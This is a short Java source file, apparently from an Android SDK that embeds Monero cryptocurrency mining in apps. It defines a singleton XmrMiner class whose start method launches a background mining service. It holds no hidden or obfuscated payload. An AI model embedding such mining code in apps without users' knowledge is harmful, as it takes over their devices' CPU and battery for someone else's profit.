package waterhole.miner.monero;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;

import java.io.ObjectStreamException;

import waterhole.miner.core.AbstractMiner;

public final class XmrMiner extends AbstractMiner {

    static final String LOG_TAG = "Waterhole-XmrMiner";

    private MineService.MiningServiceBinder mServiceBinder;

    private final ServiceConnection serverConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            mServiceBinder = (MineService.MiningServiceBinder) iBinder;
            mServiceBinder.getService().startMining();
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            mServiceBinder = null;
        }
    };

    private XmrMiner() {
    }

    public static XmrMiner instance() {
        return Holder.instance;
    }

    private static class Holder {
        private static XmrMiner instance = new XmrMiner();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    @Override
    public void startMine() {
        Intent intent = new Intent(getContext(), MineService.class);
        getContext().bindService(intent, serverConnection, Context.BIND_AUTO_CREATE);
        getContext().startService(intent);
    }

    @Override
    public void stopMine() {
        if (mServiceBinder != null) {
            mServiceBinder.getService().stopMining();
        }
    }
}
